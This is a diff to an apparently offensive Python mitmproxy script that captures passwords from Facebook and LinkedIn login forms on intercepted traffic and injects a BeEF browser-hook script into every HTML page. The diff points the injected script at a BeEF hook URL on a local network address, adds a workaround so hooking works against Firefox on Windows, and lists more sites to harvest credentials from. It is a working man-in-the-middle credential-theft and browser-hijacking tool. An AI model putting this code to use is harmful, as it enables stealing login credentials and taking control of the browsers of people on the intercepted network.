@@ -6,10 +6,13 @@ from mitmproxy.models import decoded
 class Get_Pwords:
 	'''
 		TO DO:
-		pass uid from control_pannel.py
+		add Pandora
+		add tumblr
+		add reddit
+		
 	'''
 	def __init__(self, uid):
-		self.iframe_url = "https://192.168.3.1/filter.js"
+		self.iframe_url = "https://192.168.3.1:3000/hook.js"
 		self.interface = MITM_Interface(uid)
 
 
@@ -19,6 +22,7 @@ class Get_Pwords:
 			return self.interface.read_traffic("facebook", form['pass'])
 		else:
 			pass
+			
 		
 	def get_linkedin(self,form, flow):
 		if "linkedin.com" in flow.request.headers['Host'] and form['session_password']:
@@ -92,7 +96,9 @@ class Get_Pwords:
 
 	def beef_hook(self, flow):
 		if flow.request.host in self.iframe_url:
-			return
+			return #so we don't inject into the hook itself
+		if 'self-repair.mozilla.org' in str(flow.request.pretty_url):
+			return #avoid hooking issue with mozilla on Windows 
 		html = BeautifulSoup(flow.response.content, "html.parser")
 		if html.body:
 			script = html.new_tag("script", src=self.iframe_url)
@@ -148,6 +154,8 @@ class Get_Pwords:
 			except KeyError as ke:
 				pass
 
+
+
 	def response(self, flow):
 		self.beef_hook(flow)
 
@@ -155,5 +163,4 @@ class Get_Pwords:
 def start():
 	ide = ''.join(sys.argv)
 	return Get_Pwords(ide.lstrip("get_pwords.py --"))
-
 
